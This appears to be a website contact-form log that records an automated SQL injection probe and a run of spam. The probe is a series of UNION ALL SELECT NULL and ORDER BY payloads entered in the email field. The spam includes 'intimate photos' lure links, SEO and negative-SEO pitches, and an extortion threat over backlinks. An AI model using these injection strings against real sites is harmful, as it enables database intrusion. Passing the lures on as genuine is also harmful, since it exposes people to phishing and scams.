+++ 2022-01-20 05:43:37 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:38 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:38 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:38 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:39 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:39 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:40 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:40 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:41 AM -- Email from: 1, -- subject: 1, -- email: 1' ORDER BY 1#, -- Message is: 
+++ 2022-01-20 05:43:41 AM -- Email from: 1, -- subject: 1, -- email: 1' ORDER BY 8196#, -- Message is: 
+++ 2022-01-20 05:43:41 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL#, -- Message is: 
+++ 2022-01-20 05:43:42 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:42 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:43 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:43 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:44 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:44 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:44 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:45 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:45 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:46 AM -- Email from: 1, -- subject: 1, -- email: 1%' ORDER BY 1#, -- Message is: 
+++ 2022-01-20 05:43:46 AM -- Email from: 1, -- subject: 1, -- email: 1%' ORDER BY 3534#, -- Message is: 
+++ 2022-01-20 05:43:46 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL#, -- Message is: 
+++ 2022-01-20 05:43:47 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:47 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:48 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:48 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:49 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:49 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:49 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:50 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:50 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 01:57:14 PM -- Email from: aspic, -- subject: I promised., -- email: y0q0wvpm@hotmail.com, -- Message is: Hi, this is Irina. I am sending you my intimate photos as I promised. https://tinyurl.com/y9awvrbe
+++ 2022-01-20 09:42:14 PM -- Email from: aspic, -- subject: I promised., -- email: 77l994ev@gmail.com, -- Message is: Hi, this is Irina. I am sending you my intimate photos as I promised. https://tinyurl.com/y8v6alrv
+++ 2022-01-22 02:46:40 PM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-01-23 03:20:47 PM -- Email from: Paul Parkes, -- subject: YOU NEED HELP TO BUILD SEO LINKS FOR: esyray.com  ?, -- email: paul.parkes@gmail.com, -- Message is: Hello
 
YOU NEED HELP TO BUILD SEO BACKLINKS FOR: esyray.com  ?
 
WE SELL HIGH-QUALITY DOFOLLOW POWERFUL BACKLINKS WITH HIGH DOMAIN AUTHORITY, PA, TF, CF...
 
► Rank Higher In Google (google backlinks, DoFollow backlinks, SEO DoFollow backlinks)
► Rank Higher Video in Youtube &amp; Google (youtube backlinks, video backlinks, video embedded)
► Rank Higher GMB In Google Maps (Google maps backlinks, GMB maps backlinks, GMB embedded, NAP embedded)
► Rank Higher Images In Google (google images backlinks, google backlinks)
  
You Can Increase Traffic to your websites which will lead to a higher number of customers and much more sales for you. 
 
CLAIM YOUR FREE TEST HERE =&gt;  http://donovanuems63185.bloggerbags.com/11147306/get-quality-powerful-backlinks
 
 
Thanks, Paul Parkes
+++ 2022-01-24 09:11:48 AM -- Email from: Horny Shriya, -- subject: (2) Horny Shriya sent you messages, -- email: lesli.mallette@outlook.com, -- Message is: Horny Shriya sent you 2 pics yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/HornyShriya/
+++ 2022-01-26 05:11:33 AM -- Email from: Grayce Sigmond, -- subject: Jarod Boutwell, -- email: NedPedrick51921@gmail.com, -- Message is: You can submit your site to over 1000 different business/advertising directories for free with one click https://1mdr.short.gy/submityourwebsite
+++ 2022-01-27 09:21:39 AM -- Email from: Emmett Bancks, -- subject: (1) CO2 meters helps fight corona virus transmission, -- email: emmett.bancks@yahoo.com, -- Message is: BREAKING! Portable CO2 meters could be used to help fight coronavirus transmission, experts say

Click here to learn more

https://bit.ly/co2-monitor
+++ 2022-01-28 02:31:16 AM -- Email from: Mike Albertson, -- subject: Get more dofollow backlinks for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
We all know the importance that dofollow link have on any website`s ranks. 
Having most of your linkbase filled with nofollow ones is of no good for your ranks and SEO metrics. 
 
Buy quality dofollow links from us, that will impact your ranks in a positive way 
https://www.digital-x-press.com/product/150-dofollow-backlinks/ 
 
Best regards 
Mike Albertson
 
support@digital-x-press.com
+++ 2022-01-28 06:39:31 AM -- Email from: Mike Ferguson, -- subject: quality monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Hi there 
 
I have just verified your SEO on  esyray.com for the ranking keywords and saw that your website could use a push. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
 
regards 
Mike Ferguson
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2022-01-28 04:48:41 PM -- Email from: Kevin Johnson, -- subject: Here you go, -- email: tbformleads@gmail.com, -- Message is: Hello 
 
My main objective here, is to help increase revenue for you by producing an animated video that will generate leads and sales for your business 24/7, for just $97. 
 
But this offer is only good this week, so get your video before the deadline. 
 
Watch Our Video Now!   https://bit.ly/Xpress97offer 
 
For less than you spend on coffee each month you get an American Owned Video company that can write your script, create your story board, lay-in a good soundtrack and produce an awesome video that brings home the bacon. 
 
Again, this $97 promotion is for this week only. Don’t miss out!!! 
 
I’m in, show me what you got.   https://bit.ly/Xpress97offer 
 
Best, 
 
Kevin Johnson 
Business Development Manager
+++ 2022-01-29 05:28:05 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-01-29 10:14:27 PM -- Email from: Ranker SEO, -- subject: Rank Your Website with Backlinks from 20 Years Aged Domains, -- email: kuehner.aleida@gmail.com, -- Message is: Hello, 

Greetings from Ranker SEO.

Are you looking for a genuine SEO service to rank your website top on Google? Are you cheated by fake SEO companies? 

You have found an affordable legitimate SEO agency to rank your website.

Buy backlinks from 20 years aged domains and rank your website top on Google. Exclusive High quality websites to improve your website authority and ranking.

AI Based Powerful Link Building Technology to improve your website ranking fast. 100% safe and secured methods.

Limited number of positions available! Hurry Now!

Our Skype ID: support@ranker.one
Our Website: https://www.ranker.one

Thanks &amp; Regards
Ranker SEO
+++ 2022-01-30 04:09:05 AM -- Email from: hal, -- subject: Offer of cooperation., -- email: nfntwrk@gmail.com, -- Message is: Good day! 
My name is Kori. My letter is addressed to the owner of this website. I am a partner of SocHelping - The new international network of mutual financial support. 
Service is designed to ensure that everyone who wants to improve their financial situation, could get support from other people around the world! Working Marketing allows you to develop a business structure with profits up to $500,000. I am building my business and I invite You to become part of this Financial Structure! I think You will be interested in this proposal, which includes help from partners, that is, I will participate in the development of Your business. 
All the information is on the website! In the Promo section You can find promotional materials for advertising! All questions You can ask in the support section. 
This is the best solution at the beginning of 2022! Happy to cooperate! 
https://sochelping.com/p/Doctor
+++ 2022-02-01 10:41:34 AM -- Email from: Joe Gard, -- subject: esyray.com shipping rates from China, -- email: pmtaking@163.com, -- Message is: Hi  esyray.com

We are the Top 100 freight forwarder in China,We can handle the shipment from Shenzhen, Guangzhou,Xiamen, Shanghai, Ningbo, Qingdao and so on.
 
 Here below is our main services:
1. Air freight&amp;Ocean freight forwarding
2. FBA shipping
3. Consolidation,Warehousing
4. Customs broker
5. Insurance
6. DDU&amp;DDP

some price for your reference:
China ports to the LA/West ports in the USA  :USD8000-13000/40HQ
China ports to the NY/East ports in the USA: USD9000-15000/40HQ
China ports to Australia Ports: USD5000-8000/40HQ
China ports to Europe Ports:USD9500-13500/40HQ
China ports to Latin America: USD9000-14000/40HQ

Would you like tell me which is your depart ports in China and which is your destination ports?We will offer the best price for you.


Thanks&amp;Best Regards,

Kroes     
pmtaking@163.com

-------------------------------------------
esyray.com
https://esyray.com/
E-Systems/Raytheon Garland Retirees
+++ 2022-02-01 04:30:10 PM -- Email from: Angus Conklin, -- subject: Urgent, -- email: contact@club-brands.com, -- Message is: Hello Sir!

I working for Bizcope SEO company in Bangladesh. My client needing backlinks urgently. So sir, I requesting that you give me a do follow, permanent backlink on your blog. When you are done, please sending me email to confirming. Here is my client website:

https://cbdfx.co.uk/collections/cbd-gummies

Plz also creating a 5 star GMB and Trust Pilot reviewings too.

If I do not seeing a backlink in one week, I am create million toxic blog comment spam and redirect backlink to esyray.com and you can saying goodbye to your Google rankings for 1 year or more.

I trust you making correct decision Sir. I giving you 7 days. If I getting link from you, I will also add a back-link to esyray.com on https://cbdfx.co.uk/collections/cbd-gummies

Best wishes from sunny Bangladesh

Dusyanthan Balasubramanian

Bizcope | SEO, Web Design &amp; Digital Marketing Company
Address: 89/7 Gopibag Biswa Road, Nadian Tower, Level 3 Dhaka, 1203, Bangladesh
+++ 2022-02-02 01:54:30 PM -- Email from: Eric Jones, -- subject: Strike when the iron’s hot, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey there, I just found your site, quick question…

My name’s Eric, I found esyray.com after doing a quick search – you showed up near the top of the rankings, so whatever you’re doing for SEO, looks like it’s working well.

So here’s my question – what happens AFTER someone lands on your site?  Anything?

Research tells us at least 70% of the people who find your site, after a quick once-over, they disappear… forever.

That means that all the work and effort you put into getting them to show up, goes down the tubes.

Why would you want all that good work – and the great site you’ve built – go to waste?

Because the odds are they’ll just skip over calling or even grabbing their phone, leaving you high and dry.

But here’s a thought… what if you could make it super-simple for someone to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket?
  
You can – thanks to revolutionary new software that can literally make that first call happen NOW.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re still there at your site.
  
You know, strike when the iron’s hot!

CLICK HERE http://jumboleadmagnet.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

When targeting leads, you HAVE to act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s why you should check out our new SMS Text With Lead feature as well… once you’ve captured the phone number of the website visitor, you can automatically kick off a text message (SMS) conversation with them. 
 
Imagine how powerful this could be – even if they don’t take you up on your offer immediately, you can stay in touch with them using text messages to make new offers, provide links to great content, and build your credibility.

Just this alone could be a game changer to make your website even more effective.

Strike when  the iron’s hot!

CLICK HERE http://jumboleadmagnet.com to learn more about everything Talk With Web Visitor can do for your business – you’ll be amazed.

Thanks and keep up the great work!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Stop wasting money chasing eyeballs that don’t turn into paying customers. 
CLICK HERE http://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-02-02 05:50:36 PM -- Email from: Lester Oglesby, -- subject: Query, -- email: oglesby.lester@outlook.com, -- Message is: What do you think about our feature in Giejo magazine?

https://shopgiejo.com/health/how-to-tell-whether-your-chicken-is-bad/

What's the price of a sponsored post on esyray.com?

Thanks in advance

Lester Oglesby
+++ 2022-02-02 08:10:38 PM -- Email from: Mariam Turriff, -- subject: , -- email: jaouadhifarah0@bebekpenyet.buzz, -- Message is: Add your site to 1000 business directories with one click here-&gt; https://bit.ly/submityoursite1000
+++ 2022-02-03 03:04:12 AM -- Email from: Mike Nash, -- subject: Competitors not playing the SEO game fair?, -- email: no-replydrype@gmail.com, -- Message is: Negative SEO attack Services. Deindex bad competitors from Google. It works with any Website, video, blog, product or service. 
https://www.seo-treff.de/product/derank-seo-service/
+++ 2022-02-03 03:13:59 AM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE http://jumboleadmagnet.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE http://jumboleadmagnet.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-02-04 07:20:47 PM -- Email from: Thomas Kraynik, -- subject: Hoping to help you out | Digital Disruptive Marketing, -- email: autoreply@ddmmarketing.ro, -- Message is: Hi there, 
After analyzing your business's online presence, we identified some key growth opportunities. 
We can develop these points and provide you our data and market intelligence report analysis on your specific niche. 
My company helps businesses like yours to grow and disrupt the market. 
Best of all, we handle all the IT and marketing implementations, making it extremely simple for you. 
So, if you are interested in learning more about how we can help you get more clients and grow your brand let me know what your calendar looks like. 
Best, 
Thomas Kraynik | SVP 
Digital Disruptive Marketing 
The new way of outsourced marketing 
Email: thomas@ddm.marketing 
https://ddm.marketing
+++ 2022-02-04 08:18:25 PM -- Email from: Kristie Moore, -- subject: Voice Search, -- email: kristie@business-directory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz.xyz/mroe-cusotmers/?=esyray.com


Kristie
Voice Activation Follow-up Specialist
Business Directory Link



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-02-04 09:08:17 PM -- Email from: Buster Zarate, -- subject: 100k Visitors on esyray.com, -- email: zarate.buster@msn.com, -- Message is: Buy 100k Visitors on esyray.com. Boost your ranking in google and search engines.

Your website, a product, you name it!

Offer is Valid till 4 February 2022.

https://marketingguru.sell.app/product/100k-visitors
+++ 2022-02-05 04:24:55 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-02-05 04:48:40 AM -- Email from: FrankGinop, -- subject: #SHIBburnBlog #SHIBArmi, -- email: donaldperry30@yahoo.com.mx, -- Message is: Hello #SHIBArmi. 
If you want to help burn a lot of SHIB coins, then visit this site every day https://shib-burn-blog.blogspot.com/2022/02/the-goal-of-our-blog-is-price-of-shib.html and click on ads. 
100% of ad revenue will go towards burning SHIB, it only takes 1 minute of your time. 
And also, if possible, spread this message on social networks and wherever possible 
#SHIBburnBlog #SHIBArmi
+++ 2022-02-05 06:06:33 AM -- Email from: Steve Nelson, -- subject: Mistake on your site, -- email: nelson3928@hotmail.com, -- Message is: Hello,

You following link is broken on your website: https://www.esyray.com/lettersfromretirees.html

Sometimes errors like can hurt your web traffic.  Maybe check out a service that alerts you to issues like DeadLinkCheck.com

-Steve
+++ 2022-02-05 03:48:27 PM -- Email from: Lucia Boothe, -- subject: Rank No.1 on Google, -- email: lucia.boothe4@gmail.com, -- Message is: Want to Rank No.1 on Google for your business?

We can put esyray.com as the first result everytime!

https://cutt.ly/No1OnGoogle
+++ 2022-02-06 06:15:11 AM -- Email from: aspic, -- subject: I promised., -- email: 2dlx716c@yahoo.com, -- Message is: Hi, this is Irina. I am sending you my intimate photos as I promised. https://tinyurl.com/ycukppf7
+++ 2022-02-06 06:33:10 AM -- Email from: Eric Jones, -- subject: Strike when the iron’s hot, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey there, I just found your site, quick question…

My name’s Eric, I found esyray.com after doing a quick search – you showed up near the top of the rankings, so whatever you’re doing for SEO, looks like it’s working well.

So here’s my question – what happens AFTER someone lands on your site?  Anything?

Research tells us at least 70% of the people who find your site, after a quick once-over, they disappear… forever.

That means that all the work and effort you put into getting them to show up, goes down the tubes.

Why would you want all that good work – and the great site you’ve built – go to waste?

Because the odds are they’ll just skip over calling or even grabbing their phone, leaving you high and dry.

But here’s a thought… what if you could make it super-simple for someone to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket?
  
You can – thanks to revolutionary new software that can literally make that first call happen NOW.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re still there at your site.
  
You know, strike when the iron’s hot!

CLICK HERE https://jumboleadmagnet.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

When targeting leads, you HAVE to act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s why you should check out our new SMS Text With Lead feature as well… once you’ve captured the phone number of the website visitor, you can automatically kick off a text message (SMS) conversation with them. 
 
Imagine how powerful this could be – even if they don’t take you up on your offer immediately, you can stay in touch with them using text messages to make new offers, provide links to great content, and build your credibility.

Just this alone could be a game changer to make your website even more effective.

Strike when  the iron’s hot!

CLICK HERE https://jumboleadmagnet.com to learn more about everything Talk With Web Visitor can do for your business – you’ll be amazed.

Thanks and keep up the great work!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Stop wasting money chasing eyeballs that don’t turn into paying customers. 
CLICK HERE https://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-02-07 08:01:36 AM -- Email from: Lara Gorton, -- subject: Important, -- email: lara@bizvideo.link, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://bestvideo1.xyz/video1/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Lara

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://bestvideo1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-02-07 11:21:04 PM -- Email from: aspic, -- subject: I promised., -- email: 1tpywjq8@gmail.com, -- Message is: Hi, this is Jenny. I am sending you my intimate photos as I promised. https://tinyurl.com/ybfltgse
+++ 2022-02-08 12:02:37 AM -- Email from: Eric Jones, -- subject: Instead, congrats, -- email: eric.jones.z.mail@gmail.com, -- Message is: Good day, 

My name is Eric and unlike a lot of emails you might get, I wanted to instead provide you with a word of encouragement – Congratulations

What for?  

Part of my job is to check out websites and the work you’ve done with esyray.com definitely stands out. 

It’s clear you took building a website seriously and made a real investment of time and resources into making it top quality.

There is, however, a catch… more accurately, a question…

So when someone like me happens to find your site – maybe at the top of the search results (nice job BTW) or just through a random link, how do you know? 

More importantly, how do you make a connection with that person?

Studies show that 7 out of 10 visitors don’t stick around – they’re there one second and then gone with the wind.

Here’s a way to create INSTANT engagement that you may not have known about… 

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know INSTANTLY that they’re interested – so that you can talk to that lead while they’re literally checking out esyray.com.

CLICK HERE https://jumboleadmagnet.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be a game-changer for your business – and it gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately (and there’s literally a 100X difference between contacting someone within 5 minutes versus 30 minutes.)

Plus then, even if you don’t close a deal right away, you can connect later on with text messages for new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is simple, easy, and effective. 

CLICK HERE https://jumboleadmagnet.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-02-08 10:02:47 AM -- Email from: Micki Soule, -- subject: datalist.biz has data that can help your company, -- email: micki.soule@gmail.com, -- Message is: Hey.

https://datalist.biz/ has made available its databases for the first time to companies.

Please visit us for our limited time offer.

https://datalist.biz/
+++ 2022-02-08 10:54:31 PM -- Email from: Ranker SEO, -- subject: Rank 1 on Google With Ranker SEO, -- email: woodley.kayleigh@gmail.com, -- Message is: Hello, 

Greetings from Ranker SEO.

Are you looking for a genuine SEO service to rank your website top on Google? Are you cheated by fake SEO companies? 

You have found an affordable legitimate SEO agency to rank your website.

We have ranked 100s of websites such as blogs, shopify stores, ecommerce websites, adult websites, saas websites, etc. You can reach more customers by utilizing our backlinks.

For real proof, you can visit our website and check out. Contact us for more details.

Our Skype ID: support@ranker.one
Our Website: https://www.ranker.one

Thanks &amp; Regards
Ranker SEO

If you don't like to receive our messages, you can unsubscribe by click here https://www.ranker.one/unsubscribe/?site=esyray.com
+++ 2022-02-08 11:46:49 PM -- Email from: Jenny, -- subject: The Best Ad Network for Affiliates &amp; Advertisers in 2022, -- email: jenny@foremedia.net, -- Message is: Do you advertise on Google / Facebook / Native? You are leaving money on the table!

Hey, my name is Jenny from ForeMedia.net, I saw your site and noticed that while It looks great, you could use a little bit more traffic you drive more visitors &amp; conversions...

Luckily for you, I can help you with that!

I can get you tens of thousands of visitors from pretty much every country on the globe, for 10-15% of the cost you would normally pay on Google or Facebook and the traffic is of a much higher quality because your ads will be placed on high quality sites we work with directly...

Sounds good? You can reply to this email:  jenny.sa@foremedia.net
Or visit our self-serve platform here: https://go.foremedia.net/u/v/

We also have Live chat with English speaking agents willing to help you start and optimize your ads for maximum traffic, give it a try here:

https://go.foremedia.net/u/v/
+++ 2022-02-09 05:53:31 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-02-09 02:56:33 PM -- Email from: Rubin Ebner, -- subject: Introduction, -- email: ebner.rubin@gmail.com, -- Message is: Good Afternoon

I found esyray.com on Instagram

My name is Rubin Ebner and I am the affiliate manager at justcbdstore.uk

I am writing to invite esyray.com to join JustCBD UK Affiliate Program.

Unlock a steady stream of income by participating as an official affiliate with us. Our affiliates make 10% to 20% commission on each successful sale they refer to us. Each and every sale you refer is track and attributed to you, even if the visitor leaves and completes the sale at a later date. We make sure to meet and exceed industry averages on sales commissions.

To learn more and register with the JustDelta Store Affiliate Program, visit https://justcbdstore.uk/affiliate-info-justcbduk/

We look forward to seeing you on-board.

Warm Regards
Rubin Ebner
Australia, WA, Pemberton, 6260, 61 Bellion Drive, (08) 9050 6752
+++ 2022-02-09 10:26:29 PM -- Email from: Mike Mackenzie, -- subject: Increase sales for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Good Day 
 
If you'll ever need a permanent increase in your website's Domain Authority score, We can help. 
 
More info: 
https://www.strictlydigital.net/product/moz-da50-seo-plan/ 
 
NEW: Ahrefs DR70 plan: 
https://www.strictlydigital.net/product/ahrefs-seo-plan/ 
 
 
Thank you 
Mike Mackenzie
 
mike@strictlydigital.net
